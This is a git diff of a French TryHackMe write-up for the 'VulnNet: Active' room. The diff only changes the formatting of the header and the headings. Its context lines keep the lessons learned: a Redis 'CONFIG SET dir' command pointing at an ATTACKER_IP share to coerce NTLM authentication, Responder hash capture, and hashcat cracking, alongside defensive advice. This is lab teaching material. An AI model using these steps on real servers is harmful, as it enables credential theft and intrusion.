@@ -1,6 +1,9 @@
 # VulnNet: Active — TryHackMe — Medium
 
-> **Date:** 2026-06-10 **Platform:** TryHackMe **Difficulty:** Medium **Tags:** `#redis` `#ntlmv2` `#responder` `#smb` `#ps1-hijack` `#SeImpersonatePrivilege` `#GodPotato` `#windows` `#activedirectory`
+> **Date:** 2026-06-10\
+> **Platform:** TryHackMe\
+> **Difficulty:** Medium\
+> **Tags:** `#redis` `#ntlmv2` `#responder` `#smb` `#ps1-hijack` `#SeImpersonatePrivilege` `#GodPotato` `#windows` `#activedirectory`
 
 ---
 ## Summary
@@ -239,7 +242,7 @@ cd C:\Enterprise-Share
 
 ## Lessons Learned
 
-#### 🔴 Côté Attaquant (Offensive)
+### 🔴 Côté Attaquant (Offensive)
 
 - **Redis sans auth sur Windows = vecteur NTLM immédiat** → `CONFIG SET dir \\<ATTACKER_IP>\share` force le serveur à initier une authentification SMB vers l'attaquant. Responder capture le NTLMv2 hash sans aucune interaction utilisateur. Réflexe : dès que Redis est ouvert et non authentifié sur Windows, lancer Responder en parallèle.
 - **NTLMv2 ≠ NTLM** → hashcat mode `5600` pour NetNTLMv2, pas `1000`. Confusion fréquente — le hash capturé par Responder est un challenge/response, pas un hash direct Pass-the-Hash.
@@ -249,7 +252,7 @@ cd C:\Enterprise-Share
 
 ---
 
-#### 🔵 Côté Défenseur (Defensive / Blue Team)
+### 🔵 Côté Défenseur (Defensive / Blue Team)
 
 - Redis ne doit jamais être exposé sans authentification, surtout sur Windows — `requirepass` dans `redis.conf` est le minimum. Idéalement : bind sur `127.0.0.1` uniquement.
 - Monitorer les connexions SMB sortantes depuis des serveurs internes vers des IPs externes — signature directe du trick UNC path / Responder.
